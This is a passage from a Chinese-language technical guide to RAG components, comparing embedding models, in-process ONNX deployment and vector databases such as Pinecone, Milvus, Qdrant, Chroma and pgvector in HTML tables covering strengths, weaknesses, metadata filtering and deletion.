Hub 和 Sentence-Transformers 库易于使用</td><td>USE-Transformer 推理速度相对较慢，模型文件较大，USE-DAN 性能相对 USE-Transformer 稍逊，TensorFlow 生态系统相对 PyTorch 复杂，部分模型更新迭代相对较慢</td><td>通用场景 RAG，多语言 RAG，对速度有一定要求 (USE-DAN)，希望使用 TensorFlow 生态系统的用户，作为通用句子嵌入基线模型</td></tr><tr><td><strong>OpenAI Embeddings (text-embedding-ada-002)</strong></td><td>专有模型 (Transformer-based)</td><td>顶尖 (MTEB 排行榜领先)</td><td>极快</td><td>1536</td><td>多语言</td><td>OpenAI 专有模型，基于强大的 Transformer 架构，在大规模高质量文本数据上训练，针对各种 NLP 任务进行优化，提供顶尖的句子嵌入性能。</td><td>云服务 API (OpenAI API)，极其易于使用，通过简单的 API 调用即可获取嵌入</td><td>商业收费 (按 token 使用量)</td><td><strong>顶尖性能</strong>，极速推理速度，易于使用，云服务全托管，多语言支持，OpenAI 的品牌和技术背书，持续迭代更新</td><td><strong>成本较高</strong> (按 token 收费)，依赖网络连接，数据隐私和安全需考虑，模型细节封闭，无法定制和微调，锁定 OpenAI 服务</td><td><strong>高性能 RAG 系统首选</strong>，需要顶尖性能和易用性，对延迟极其敏感的应用，预算充足，可以接受云服务和数据传输，追求快速部署和零运维</td></tr><tr><td><strong>Cohere Embeddings (cohere.embed)</strong></td><td>专有模型 (Transformer-based)</td><td>高 (MTEB 排行榜前列)</td><td>快</td><td>1024</td><td>多语言</td><td>Cohere 专有模型，基于 Transformer 架构，在大规模文本数据上训练，提供高质量的句子嵌入表示，侧重于负责任的 AI 开发。</td><td>云服务 API (Cohere API)，易于使用，提供多种模型尺寸选择 (small, medium, large)</td><td>商业收费 (按 token 使用量)</td><td>高性能，推理速度快，易于使用，云服务全托管，多语言支持，提供多种模型尺寸选择，Cohere 在数据隐私和安全方面有较好声誉</td><td><strong>成本较高</strong> (按 token 收费)，依赖网络连接，数据隐私和安全需一定程度信任 Cohere，模型细节封闭，无法定制和微调，锁定 Cohere 服务，生态系统相对 OpenAI 稍小</td><td><strong>高性能 RAG 系统</strong>，需要高性能和易用性，对延迟有一定要求，预算充足，对数据隐私和安全有一定关注，希望根据需求选择不同性能和成本模型</td></tr><tr><td><strong>Jina Embeddings</strong></td><td>多种模型可选 (Transformer, 平均池化等)</td><td>中等-较高 (取决于具体模型)</td><td>较快-中等 (取决于具体模型)</td><td>768 (例如 jina-embeddings-v2-base-en)</td><td>多语言 (取决于具体模型)</td><td>Jina AI 提供，包含多种开源嵌入模型，基于 Transformer 和平均池化等架构，部分模型在特定任务上进行了优化，提供 Python 库和云服务 API 两种使用方式。</td><td>Python 库 (Jina Embeddings)，易于使用，本地部署，也提供云服务 API (JCloud AI Embeddings)，选择灵活</td><td>开源免费 (Python 库)，云服务 API 收费 (JCloud AI Embeddings)</td><td>模型选择多样，开源 Python 库和云服务 API 可选，易于使用，社区支持，部分模型性能良好，针对多模态和跨模态检索有专门模型</td><td>云服务 API 稳定性可能不如 OpenAI/Cohere 成熟，开源模型的性能可能不如顶尖商业模型，生态系统和知名度相对 OpenAI/Cohere 稍小，模型性能和质量参差不齐，需要仔细选择模型</td><td><strong>多用途 RAG 系统</strong>，需要多种模型选择，希望同时拥有开源和云服务选项，对成本敏感，或希望支持开源技术栈，可以根据具体模型选择适用于不同性能要求的场景，可以尝试多模态和跨模态 RAG 应用</td></tr><tr><td><strong>E5 Embeddings (v2)</strong></td><td>Transformer (Sentence-BERT 微调)</td><td>高 (MTEB 排行榜前列)</td><td>中等-较慢</td><td>768-1024</td><td>英文为主 (部分模型多语言)</td><td>基于 Sentence-BERT 框架进行微调，针对检索任务进行了优化，使用了 Instruction Tuning 和 Query-Document 对比学习等技术，提升了检索任务的性能。</td><td>Python 库 (Sentence-Transformers, FlagEmbedding)，易于使用，本地部署，支持微调</td><td>开源免费</td><td><strong>检索任务优化</strong>，高性能，句子语义表示能力强，开源免费，易于使用，支持微调，MTEB 检索任务 benchmark 表现突出，专门为 RAG 检索场景优化</td><td>推理速度相对较慢 (Transformer)，模型文件较大，英文模型为主，多语言模型性能可能稍逊，需要一定的 Transformer 和 PyTorch 基础，模型系列较新，生态成熟度待观察</td><td><strong>检索增强型 RAG 系统首选</strong>，高性能信息检索，问答系统，需要针对检索任务进行优化的场景，希望开源免费和本地部署，追求检索性能最大化</td></tr><tr><td><strong>Instructor Embeddings</strong></td><td>Transformer (Sentence-BERT 微调)</td><td>高 (MTEB 排行榜前列)</td><td>中等-较慢</td><td>768-1024</td><td>多语言</td><td>基于 Sentence-BERT 框架进行微调，使用了 Instruction Tuning 技术，通过指令 (instruction) 引导模型生成更符合任务需求的嵌入，提升了各种 NLP 任务的性能。</td><td>Python 库 (Instructor-Embedding)，易于使用，本地部署，支持指令定制 (instruction customization)</td><td>开源免费</td><td><strong>指令驱动嵌入</strong>，高性能，通用 NLP 任务性能优秀，开源免费，易于使用，支持指令定制，可以通过指令灵活控制模型行为，适用于各种 RAG 和 NLP 任务</td><td>推理速度相对较慢 (Transformer)，模型文件较大，模型系列较新，生态成熟度待观察，需要理解 Instruction Tuning 的概念和使用方法</td><td><strong>通用 RAG 和 NLP 任务</strong>，需要高性能和灵活控制模型行为，希望通过指令引导模型生成特定类型的嵌入，可以尝试指令定制功能，适用于各种复杂 NLP 任务，希望开源免费和本地部署</td></tr><tr><td><strong>BGE Embeddings (BAAI General Embedding)</strong></td><td>Transformer (BERT, RoBERTa 微调)</td><td>高 (MTEB 排行榜前列)</td><td>中等-较慢</td><td>768-1024</td><td>多语言</td><td>北京智源人工智能研究院 (BAAI) 发布，基于 Transformer 框架进行微调，使用了对比学习和多任务学习等技术，旨在提供通用的高质量嵌入模型，支持多种语言。</td><td>Python 库 (FlagEmbedding)，易于使用，本地部署，开源免费</td><td>开源免费</td><td><strong>通用高性能</strong>，多语言支持，开源免费，易于使用，MTEB 排行榜表现优秀，北京智源出品，具有一定的技术背书，模型持续更新迭代</td><td>推理速度相对较慢 (Transformer)，模型文件较大，模型系列相对较新，生态成熟度待观察，需要一定的 Transformer 和 PyTorch 基础，部分模型可能需要根据具体任务进行选择和调优</td><td><strong>通用 RAG 和 NLP 任务</strong>，需要高性能和多语言支持，希望开源免费和本地部署，可以作为 Sentence-BERT, E5 Embeddings, Instructor Embeddings 等模型的替代方案，尝试不同模型的性能差异</td></tr></tbody></table><h1><span id="另一种嵌入模型策略in-process-onnx">另一种嵌入模型策略In-process (ONNX)</span></h1><ul><li><p><strong>ONNX (Open Neural Network Exchange):</strong> ONNX 是一种开放标准，用于表示机器学习模型。 它的主要目的是 <strong>提高不同深度学习框架之间的互操作性</strong>。 您可以将使用 PyTorch、TensorFlow、 scikit-learn 等框架训练的模型导出为 ONNX 格式。 这样，您就可以使用 <strong>ONNX Runtime</strong> 这个高性能推理引擎来加载和运行这些 ONNX 模型，而无需依赖原始的训练框架。</p></li><li><p><strong>In-process (进程内) 执行:</strong> “In-process” 指的是将 ONNX Runtime 引擎 <strong>集成到您的应用程序进程中</strong>，直接在应用程序的进程空间内加载和执行 ONNX 模型。 与 “Out-of-process” (进程外) 执行 (例如通过 gRPC 或 REST API 调用独立的模型服务进程) 相对。</p></li></ul><p><strong>如何理解 “In-process (ONNX)” 与 嵌入模型的关系？</strong></p><ol><li><p><strong>ONNX 不是一种新的模型架构:</strong> ONNX 本身 <strong>不是一种新的嵌入模型架构</strong>，它只是一个 <strong>模型格式</strong>。 您可以将各种类型的嵌入模型 (例如 Sentence-BERT, E5 Embeddings, Instructor Embeddings 等) 导出为 ONNX 格式。</p></li><li><p><strong>ONNX Runtime 是一个推理引擎:</strong> ONNX Runtime 是一个 <strong>跨平台的推理引擎</strong>，它可以 <strong>高效地执行 ONNX 格式的机器学习模型</strong>。 包括各种神经网络模型，当然也包括各种嵌入模型。</p></li><li><p><strong>In-process (ONNX) 是一种部署选项:</strong> 使用 ONNX Runtime 进行 “In-process” 执行，是一种 <strong>将嵌入模型部署到您的应用程序中的方法</strong>。 这意味着：</p><ul><li><p><strong>性能提升:</strong> 进程内执行通常比进程外 API 调用 <strong>更快更高效</strong>，因为避免了进程间通信的开销。</p></li><li><p><strong>简化部署:</strong> 将模型直接集成到应用程序中，<strong>简化了部署流程</strong>，无需单独部署模型服务。</p></li><li><p><strong>资源控制:</strong> 您可以更 <strong>直接地控制资源分配和管理</strong>，因为模型运行在您的应用程序进程内。</p></li><li><p><strong>离线能力:</strong> In-process 执行可以 <strong>支持离线推理</strong> (如果您的应用程序需要离线运行)。</p></li></ul></li></ol><h1><span id="rag-中常用的向量数据库-vector-databases-for-rag">RAG 中常用的向量数据库 (Vector Databases for RAG):</span></h1><p><strong>RAG 中常用的向量数据库 (Vector Databases for RAG):</strong></p><p>向量数据库专门设计用于存储和查询高维向量数据，并支持高效的相似性搜索，这正是 RAG 系统检索相关文档的关键能力。 以下是一些常用的向量数据库，可以根据部署方式和特点进行分类：</p><p><strong>1. 云端托管向量数据库 (Cloud-Managed Vector Databases):</strong></p><ul><li><p><strong>优点:</strong> 易于使用，无需管理基础设施，可扩展性好，通常提供完善的配套服务和支持。适合快速原型开发和生产环境。</p></li><li><p><strong>缺点:</strong> 可能成本较高，受限于云服务商的功能和限制，数据安全性可能需要额外考虑 (取决于服务商的安全性)。</p><ul><li><p><strong>Pinecone:</strong> 非常流行的云端向量数据库，专注于高性能和低延迟的相似性搜索，易于集成，提供多种索引类型和过滤功能。适合需要快速响应和大规模数据的 RAG 应用。</p></li><li><p><strong>Weaviate:</strong> 开源的云原生向量数据库，也提供托管服务。强调图数据库能力，可以构建知识图谱，支持复杂查询和语义搜索。适合需要更复杂数据结构和查询的 RAG 应用。</p></li><li><p><strong>Milvus Cloud:</strong> 基于流行的开源 Milvus 向量数据库的云服务，提供高性能和高可扩展性，支持多种索引类型和距离度量。适合需要开源技术栈和高性能的 RAG 应用。</p></li><li><p><strong>Azure Cognitive Search (with Vector Search):</strong> 微软 Azure 云提供的搜索服务，集成了向量搜索功能，可以方便地与其他 Azure 服务集成。适合已在使用 Azure 云平台的 RAG 应用。</p></li><li><p><strong>AWS OpenSearch Service (with KNN):</strong> AWS 云提供的基于 Elasticsearch 的搜索服务，通过 KNN 插件支持向量搜索。适合已在使用 AWS 云平台的 RAG 应用。</p></li><li><p><strong>Google Vertex AI Matching Engine:</strong> 谷歌云 Vertex AI 平台提供的向量相似性匹配服务，与谷歌云的其他 AI 服务集成良好。适合已在使用 Google Cloud 平台的 RAG 应用。</p></li><li><p><strong>Zilliz Cloud (基于 Milvus):</strong> Zilliz 公司提供的 Milvus 云托管服务，专注于高性能和高可靠性，提供企业级支持。</p></li></ul></li></ul><p><strong>2. 自托管向量数据库 (Self-Hosted Vector Databases):</strong></p><ul><li><p><strong>优点:</strong> 完全控制数据和基础设施，可以根据自身需求定制和优化，长期来看可能更经济，适合对数据安全性和定制化要求高的场景。</p></li><li><p><strong>缺点:</strong> 需要自行部署、维护和扩展，学习曲线较陡峭，需要一定的技术能力。</p><ul><li><p><strong>Faiss (Facebook AI Similarity Search):</strong> 由 Facebook AI 开发的开源库，专门用于高效的相似性搜索，性能强大，支持多种索引类型和距离度量。常用于构建自托管向量数据库的基础组件。</p></li><li><p><strong>Milvus (开源):</strong> 开源的向量数据库，提供高性能、高可扩展性和易用性，支持多种索引类型和距离度量。社区活跃，文档完善。</p></li><li><p><strong>Chroma:</strong> 开源的嵌入式向量数据库，轻量级，易于上手，适合小型项目和快速原型开发，也支持 Python 客户端。</p></li><li><p><strong>Qdrant:</strong> 开源的向量搜索引擎，强调易用性和性能，提供 REST API 和客户端库，支持过滤和元数据操作。</p></li><li><p><strong>ScaNN (Scalable Nearest Neighbor):</strong> 谷歌开源的向量相似性搜索库，专注于大规模数据集的高效搜索。</p></li></ul></li></ul><p><strong>3. 其他选项 (Other Options):</strong></p><ul><li><strong>基于传统数据库的向量扩展:</strong> 一些传统数据库 (如 PostgreSQL, MySQL) 通过扩展 (如 pgvector, vector-ai) 也开始提供向量存储和查询功能。 适合已在使用这些数据库，且向量搜索需求相对简单的场景。 但性能和扩展性可能不如专门的向量数据库。</li></ul><p><strong>如何选择向量数据库 (Choosing a Vector Database):</strong></p><p>选择向量数据库需要根据 RAG 应用的具体需求和约束条件进行权衡：</p><ol><li><p><strong>性能和规模 (Performance and Scale):</strong></p><ul><li><p><strong>数据规模:</strong> 预计需要存储多少向量数据？ 数据库是否能支持未来的数据增长？</p></li><li><p><strong>查询吞吐量和延迟:</strong> RAG 应用对查询响应时间有什么要求？ 需要支持多少并发查询？</p></li><li><p><strong>索引类型和算法:</strong> 数据库支持哪些索引类型 (如 HNSW, IVF)? 是否支持近似最近邻搜索 (ANN)? 不同的索引类型和算法在精度、速度和资源消耗之间有所权衡。</p></li><li><p><strong>距离度量:</strong> 数据库支持哪些距离度量 (如 cosine, Euclidean, dot product)? 选择与你的 embedding 模型相匹配的距离度量。</p></li></ul></li><li><p><strong>功能和特性 (Features and Functionality):</strong></p><ul><li><p><strong>过滤 (Filtering):</strong> 是否需要基于元数据进行过滤？ 数据库是否提供灵活的过滤功能？</p></li><li><p><strong>元数据管理 (Metadata Management):</strong> 数据库如何管理与向量关联的元数据？ 是否方便进行元数据更新和查询？</p></li><li><p><strong>更新和删除 (Updates and Deletions):</strong> 是否需要频繁更新或删除向量数据？ 数据库的更新和删除性能如何？</p></li><li><p><strong>多模态支持 (Multimodal Support):</strong> 如果 RAG 应用需要处理多模态数据 (如图像、音频)，数据库是否支持多模态向量索引和查询？</p></li><li><p><strong>集成和生态系统 (Integration and Ecosystem):</strong> 数据库是否提供方便的客户端库 (如 Python SDK)? 是否容易与其他 RAG 组件 (如 LLMs, embedding 模型) 集成？</p></li></ul></li><li><p><strong>部署和管理 (Deployment and Management):</strong></p><ul><li><p><strong>云端托管 vs. 自托管:</strong> 选择云端托管可以简化部署和管理，但成本可能更高，控制权较少。 自托管需要更多技术投入，但更灵活和可控。</p></li><li><p><strong>易用性 (Ease of Use):</strong> 数据库的文档是否完善？ 是否易于学习和使用？</p></li><li><p><strong>社区和支持 (Community and Support):</strong> 开源数据库的社区是否活跃？ 商业数据库是否提供专业的技术支持？</p></li><li><p><strong>成本 (Cost):</strong> 云端托管数据库通常按使用量收费，自托管数据库需要考虑硬件、运维等成本。</p></li></ul></li><li><p><strong>安全性 (Security):</strong></p><ul><li><p><strong>数据加密:</strong> 数据库是否支持数据加密 (传输加密和静态加密)?</p></li><li><p><strong>访问控制:</strong> 数据库是否提供完善的访问控制机制？</p></li><li><p><strong>合规性:</strong> 如果 RAG 应用处理敏感数据，数据库是否满足相关的合规性要求 (如 GDPR, HIPAA)?</p></li></ul></li></ol><h1><span id="如何选择向量数据库">如何选择向量数据库？</span></h1><table><thead><tr><th>存储库名称</th><th>类型</th><th>不同之处</th><th>优点</th><th>缺点</th><th>适用场景</th><th><strong>Storing Metadata (存储元数据)</strong></th><th><strong>Filtering by Metadata (基于元数据过滤)</strong></th><th><strong>Removing Embeddings (移除嵌入)</strong></th></tr></thead><tbody><tr><td><strong>云端托管向量数据库 (Cloud-Managed Vector Databases)</strong></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td><strong>Pinecone</strong></td><td>云端托管向量数据库</td><td>专注高性能，低延迟，云原生，全托管，多种索引，成熟</td><td>极致性能，极低延迟，高吞吐量，云原生易扩展，全托管，易用性极佳，成熟稳定，文档完善</td><td>成本较高，数据控制权部分依赖云服务商，定制化程度较低，锁定云服务商</td><td>高性能、低延迟、大规模 RAG 应用，企业级应用，实时推荐，在线广告检索，对性能和易用性有极高要求，预算充足，希望完全托管，无需运维</td><td><strong>良好</strong> - 核心功能，支持键值对元数据，与向量关联存储</td><td><strong>优秀</strong> - 高效灵活，支持基于元数据的精确和范围过滤，查询性能良好</td><td><strong>良好</strong> - 支持按 ID 或条件批量删除，操作相对简单高效</td></tr><tr><td><strong>Weaviate Cloud</strong></td><td>云端托管向量数据库 (开源可选)</td><td>开源可选，云托管方便，向量+图数据库，灵活数据模型，GraphQL</td><td>开源可选，云托管方便，向量搜索+图数据库功能，GraphQL 查询灵活，数据模型灵活，可平衡性能和成本</td><td>云托管成本较高，性能相比 Pinecone 可能稍逊，学习曲线稍陡峭，大规模磁盘持久化模式下性能可能受限</td><td>需要结合知识图谱的复杂 RAG 应用，灵活数据模型和查询方式，希望同时具备开源和云托管选项，数据规模可大可小</td><td><strong>优秀</strong> - 核心功能，灵活的数据模型 (Schemas)，元数据作为 Properties 与对象关联，支持丰富的数据类型</td><td><strong>优秀</strong> - GraphQL 查询语言强大，支持复杂的基于元数据的过滤和条件查询，图查询能力也支持元数据过滤</td><td><strong>优秀</strong> - 支持按 ID 或条件批量删除，GraphQL API 提供删除操作，支持数据生命周期管理</td></tr><tr><td><strong>Milvus Cloud / Zilliz Cloud</strong></td><td>云端托管向量数据库 (基于 Milvus)</td><td>基于开源 Milvus，高性能，高可扩展性，企业级支持 (Zilliz)，多种索引，距离度量</td><td>高性能，高可扩展性，多种索引类型和距离度量，企业级支持 (Zilliz)，基于成熟开源 Milvus，云托管降低运维成本，可控成本 (Milvus Cloud)</td><td>云托管成本，数据安全性依赖云服务商，相比 Pinecone 生态系统可能稍弱，自托管 Milvus 运维复杂</td><td>需要高性能和高吞吐量的 RAG 应用，希望使用开源技术栈，有一定技术基础，追求性价比的用户，企业级大规模应用 (Zilliz Cloud)</td><td><strong>良好</strong> - 支持字段 (Fields) 存储元数据，与向量数据一起管理</td><td><strong>良好</strong> - 支持基于字段的过滤，例如布尔表达式、范围查询等，查询性能较好</td><td><strong>良好</strong> - 支持按 ID 或条件批量删除，SDK 和 CLI 提供删除操作，数据删除效率较高</td></tr><tr><td><strong>Azure Cognitive Search</strong></td><td>云端托管向量搜索服务</td><td>Azure 云平台集成，向量+关键词混合搜索，成熟云服务，易管理</td><td>与 Azure 云平台深度集成，方便与其他 Azure 服务协同，成熟云服务，易于管理，向量+关键词混合搜索，Azure 云的企业级服务和安全保障</td><td>性能可能不如专门向量数据库，受限于 Azure 云平台，成本需评估，KNN 插件性能可能需调优，非纯向量数据库</td><td>已在使用 Azure 云平台，需要与 Azure 服务集成的 RAG 应用，需要向量+关键词混合搜索，希望利用 Azure 云平台成熟基础设施</td><td><strong>良好</strong> - 支持字段存储文档元数据，与向量索引一起管理，字段类型丰富</td><td><strong>良好</strong> - 支持基于字段的过滤，例如 facet 过滤、范围查询等，结合关键词搜索实现更精细的过滤</td><td><strong>良好</strong> - 支持按文档 ID 或条件批量删除，API 和 SDK 提供删除操作，数据删除与索引更新同步</td></tr><tr><td><strong>AWS OpenSearch Service</strong></td><td>云端托管向量搜索服务</td><td>AWS 云平台集成，向量+关键词混合搜索，成熟云服务，基于 Elasticsearch</td><td>与 AWS 云平台深度集成，方便与其他 AWS 服务协同，成熟云服务，基于 Elasticsearch 强大搜索能力，向量+关键词混合搜索，AWS 云的广泛应用和生态系统</td><td>性能可能不如专门向量数据库，受限于 AWS 云平台，KNN 插件性能可能需评估，非纯向量数据库，Elasticsearch 资源消耗较高</td><td>已在使用 AWS 云平台，需要与 AWS 服务集成的 RAG 应用，需要向量+关键词混合搜索，希望利用 AWS 云平台成熟基础设施，熟悉 Elasticsearch</td><td><strong>良好</strong> - Elasticsearch 强大的文档存储能力，支持丰富的字段类型和结构化元数据</td><td><strong>优秀</strong> - Elasticsearch 强大的查询 DSL，支持复杂的基于元数据的过滤和聚合，结合全文检索实现多维度过滤</td><td><strong>良好</strong> - 支持按文档 ID 或条件批量删除，REST API 提供删除操作，数据删除与索引更新异步</td></tr><tr><td><strong>Vertex AI Matching Engine</strong></td><td>云端托管向量相似性匹配服务</td><td>Google Cloud 平台集成，高性能匹配引擎，谷歌云基础设施强大</td><td>与 Google Cloud 平台深度集成，方便与 Google Cloud AI 服务协同，谷歌云基础设施强大，高性能相似性匹配，谷歌云的强大技术实力和生态系统</td><td>受限于 Google Cloud 平台，成本需评估，生态系统相对 Pinecone 可能稍弱，非纯向量数据库</td><td>已在使用 Google Cloud 平台，需要与 Google Cloud AI 服务集成的 RAG 应用，希望利用 Google Cloud 平台强大基础设施</td><td><strong>良好</strong> - 支持 attributes 存储元数据，与向量一起管理，元数据类型丰富</td><td><strong>良好</strong> - 支持基于 attributes 的过滤，例如布尔表达式、数值范围等，查询性能较好</td><td><strong>良好</strong> - 支持按 ID 或条件批量删除，API 提供删除操作，数据删除效率较高</td></tr><tr><td><strong>自托管向量数据库 (Self-Hosted Vector Databases)</strong></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td><strong>Milvus (开源)</strong></td><td>自托管向量数据库</td><td>开源免费，高性能，高可扩展性，多种索引，距离度量，灵活部署</td><td>开源免费，高性能，高可扩展性，多种索引类型和距离度量，社区活跃，文档完善，灵活的部署方式，可控成本 (硬件成本)</td><td>需要自行部署和维护，运维成本和技术门槛较高，性能调优需要经验，大规模部署需要分布式架构知识</td><td>需要高性能和高吞吐量的 RAG 应用，希望使用开源技术栈，有技术团队进行运维，追求更高性价比，数据安全和控制权要求较高</td><td><strong>良好</strong> - 支持字段 (Fields) 存储元数据，与向量数据一起管理</td><td><strong>良好</strong> - 支持基于字段的过滤，例如布尔表达式、范围查询等，查询性能较好</td><td><strong>良好</strong> - 支持按 ID 或条件批量删除，SDK 和 CLI 提供删除操作，数据删除效率较高</td></tr><tr><td><strong>Weaviate (开源)</strong></td><td>自托管向量数据库 (开源)</td><td>开源免费，向量+图数据库，灵活数据模型，GraphQL，可配置持久化</td><td>开源免费，向量搜索+图数据库功能，GraphQL 查询灵活，数据模型灵活，可配置内存/磁盘混合存储，活跃社区，文档完善</td><td>性能相比 Milvus 或 Pinecone 可能稍逊，学习曲线稍陡峭，大规模磁盘持久化模式下性能可能受限，自托管运维成本</td><td>需要结合知识图谱的复杂 RAG 应用，灵活数据模型和查询方式，希望使用开源技术栈，有一定技术基础，希望平衡性能、功能和成本</td><td><strong>优秀</strong> - 核心功能，灵活的数据模型 (Schemas)，元数据作为 Properties 与对象关联，支持丰富的数据类型</td><td><strong>优秀</strong> - GraphQL 查询语言强大，支持复杂的基于元数据的过滤和条件查询，图查询能力也支持元数据过滤</td><td><strong>优秀</strong> - 支持按 ID 或条件批量删除，GraphQL API 提供删除操作，支持数据生命周期管理</td></tr><tr><td><strong>Qdrant</strong></td><td>自托管向量数据库</td><td>开源免费，易于使用，REST API，客户端库，元数据过滤</td><td>开源免费，易于使用，REST API 接口方便集成，客户端库友好，支持过滤和元数据操作，活跃社区，文档完善，快速上手</td><td>性能相比 Milvus 或 Pinecone 可能稍逊，扩展性可能不如云托管方案，大规模数据和高并发场景可能需集群部署，自托管运维成本</td><td>注重易用性和快速上手，需要 REST API 接口，希望快速构建原型或小型应用，数据规模适中，对性能有一定要求，希望快速验证 RAG 概念</td><td><strong>良好</strong> - 核心功能，支持 Payload 存储元数据，以 JSON 格式与向量关联</td><td><strong>优秀</strong> - 支持丰富的元数据过滤条件，例如精确匹配、范围查询、布尔表达式等，查询性能良好</td><td><strong>良好</strong> - 支持按 ID 或条件批量删除，REST API 和客户端库提供删除操作，数据删除效率较高</td></tr><tr><td><strong>Chroma</strong></td><td>自托管嵌入式向量数据库</td><td>开源免费，嵌入式，轻量级，Python 友好，简单易用</td><td>开源免费，极其轻量级，嵌入式易于安装和使用，Python 客户端友好，简单易用，快速原型开发，本地部署方便</td><td>性能和扩展性有限，不适合大规模和高并发场景，功能相对简单，持久化依赖 SQLite，性能可能受限，不适合生产环境</td><td>小型 RAG 应用，个人项目，快速原型开发，数据量小，需要在本地快速搭建向量数据库，快速验证 RAG 流程，对性能和扩展性要求不高</td><td><strong>良好</strong> - 支持 metadata 参数存储元数据，以字典形式与向量关联</td><td><strong>良好</strong> - 支持基于 metadata 的过滤，例如精确匹配、范围查询，使用 Python 代码进行过滤条件定义</td><td><strong>良好</strong> - 支持按 ID 删除，Python API 提供删除操作，数据删除操作相对简单</td></tr><tr><td><strong>Vald</strong></td><td>自托管分布式向量数据库</td><td>开源免费，分布式，高可扩展性，基于 NGT (Neighborhood Graph and Tree) 索引</td><td>开源免费，分布式架构，高可扩展性，基于 NGT 索引算法，高性能向量搜索，支持大规模数据集和高并发，可水平扩展</td><td>部署和运维相对复杂，NGT 索引构建时间较长，生态系统和社区规模相对较小，文档完善度可能不如 Milvus</td><td>需要高性能、高可扩展性、分布式架构的 RAG 应用，大规模数据集，高并发查询，有技术团队进行运维，希望使用开源分布式向量数据库</td><td><strong>良好</strong> - 支持 object metadata 存储元数据，与向量数据一起管理</td><td><strong>良好</strong> - 支持基于 metadata 的过滤，例如精确匹配、范围查询，查询性能较好</td><td><strong>良好</strong> - 支持按 ID 或条件批量删除，gRPC API 提供删除操作，数据删除效率较高</td></tr><tr><td><strong>Vespa</strong></td><td>自托管分布式搜索引擎 (向量+全文)</td><td>开源免费，分布式搜索引擎，向量+全文混合搜索，功能强大，复杂查询</td><td>开源免费，分布式架构，高可扩展性，向量+全文混合搜索，功能强大，支持复杂查询和分析，成熟的搜索引擎技术，可构建复杂搜索应用</td><td>部署和运维极其复杂，学习曲线陡峭，资源消耗较高，配置和调优需要专业知识，不以纯向量搜索为核心优化目标</td><td>需要构建复杂搜索应用，向量+全文混合搜索，需要强大查询和分析能力，大规模数据，高并发查询，有专业运维团队和搜索引擎经验</td><td><strong>优秀</strong> - schema 定义灵活，支持结构化文档和丰富的字段类型，元数据管理能力强大</td><td><strong>优秀</strong> - 强大的查询语言 (YQL)，支持极其复杂的基于元数据的过滤、排序、聚合和分析，结合全文检索实现多维度查询</td><td><strong>优秀</strong> - 支持按文档 ID 或条件批量删除，文档删除与索引更新异步高效，数据生命周期管理能力强大</td></tr><tr><td><strong>向量扩展 (Vector Extensions for Databases)</strong></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td><strong>pgvector (PostgreSQL)</strong></td><td>向量扩展 (PostgreSQL 插件)</td><td>PostgreSQL 扩展，易于集成，利用 PostgreSQL 功能，简单向量搜索</td><td>易于集成到 PostgreSQL 数据库，利用 PostgreSQL 成熟特性 (事务, 备份等)，降低技术栈复杂度，快速集成 RAG 功能，成本较低 (利用现有 PostgreSQL 基础设施)</td><td>性能和扩展性可能不如专门向量数据库，功能相对简单，受限于 PostgreSQL 性能瓶颈，不适合复杂 RAG 应用，大规模和高并发场景性能可能受限，非纯向量数据库</td><td>已在使用 PostgreSQL，向量搜索需求相对简单，希望快速集成 RAG 功能，数据量适中，利用现有 PostgreSQL 基础设施，降低技术栈复杂度</td><td><strong>良好</strong> - 利用 PostgreSQL 的表结构存储元数据，与向量列在同一张表中</td><td><strong>良好</strong> - 支持标准 SQL WHERE 子句进行元数据过滤，例如条件查询、范围查询等，利用 PostgreSQL 的索引优化查询性能</td><td><strong>良好</strong> - 支持标准 SQL DELETE 语句删除包含向量的行，数据删除与事务管理集成</td></tr><tr><td><strong>vector-ai (MySQL)</strong></td><td>向量扩展 (MySQL 插件)</td><td>MySQL 插件，易于集成，利用 MySQL 功能，简单向量搜索</td><td>易于集成到 MySQL 数据库，利用 MySQL 广泛应用和成熟生态，快速集成 RAG 功能，成本较低 (利用现有 MySQL 基础设施)</td><td>性能和扩展性可能不如专门向量数据库，功能相对简单，受限于 MySQL 性能瓶颈，不适合复杂 RAG 应用，大规模和高并发场景性能可能受限，非纯向量数据库</td><td>已在使用 MySQL，向量搜索需求相对简单，希望快速集成 RAG 功能，数据量适中，利用现有 MySQL 基础设施，降低技术栈复杂度</td><td><strong>良好</strong> - 利用 MySQL 表结构存储元数据，与向量列在同一张表中</td><td><strong>良好</strong> - 支持标准 SQL WHERE 子句进行元数据过滤，例如条件查询、范围查询等，利用 MySQL 的索引优化查询性能</td><td><strong>良好</strong> - 支持标准 SQL DELETE 语句删除包含向量的行，数据删除与事务管理集成</td></tr><tr><td><strong>MongoDB Atlas Vector Search</strong></td><td>向量搜索 (MongoDB Atlas 云服务)</td><td>MongoDB Atlas 云服务，与 MongoDB 集成，向量搜索功能，NoSQL 数据库</td><td>与 MongoDB Atlas 深度集成，方便 MongoDB 用户使用，利用 MongoDB 的灵活性和可扩展性，云服务易于管理，NoSQL 数据库的灵活性</td><td>性能可能不如专门向量数据库，受限于 MongoDB Atlas 云平台，成本需评估，非纯向量数据库，向量搜索功能相对较新</td><td>已在使用 MongoDB Atlas，需要与 MongoDB 数据集成的 RAG 应用，希望利用 MongoDB Atlas 云服务，NoSQL 数据库用户</td><td><strong>良好</strong> - 利用 MongoDB 文档的灵活性存储元数据，键值对形式，schema-less</td><td><strong>良好</strong> - 支持 MongoDB 查询语法进行元数据过滤，例如条件查询、嵌套文档查询等，利用 MongoDB 的索引优化查询性能</td><td><strong>良好</strong> - 支持 MongoDB 的文档删除操作删除包含向量的文档，数据删除与 MongoDB 的数据管理集成</td></tr><tr><td><strong>内存存储 (In-Memory Solutions)</strong></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td><strong>Redis (with Vector Modules)</strong></td><td>内存数据结构服务器 + 向量模块</td><td>见上表</td><td>见上表</td><td>见上表</td><td>见上表</td><td><strong>基础</strong> - 可以利用 Redis 的 Hash 数据结构存储元数据，与向量 Key 关联，但管理和查询相对简单</td><td><strong>基础</strong> - 可以基于 Hash 数据结构的字段进行简单过滤，例如 Get/Set 操作，但缺乏复杂的过滤查询能力</td><td><strong>基础</strong> - 支持按 Key 删除，Redis 的删除操作高效快速，但元数据和向量需要手动关联删除</td></tr><tr><td><strong>内存数据结构 (In-Memory - e.g., Python dict, NumPy array)</strong></td><td>内存数据结构</td><td>见上表</td><td>见上表</td><td>见上表</td><td>见上表</td><td><strong>非常基础</strong> - 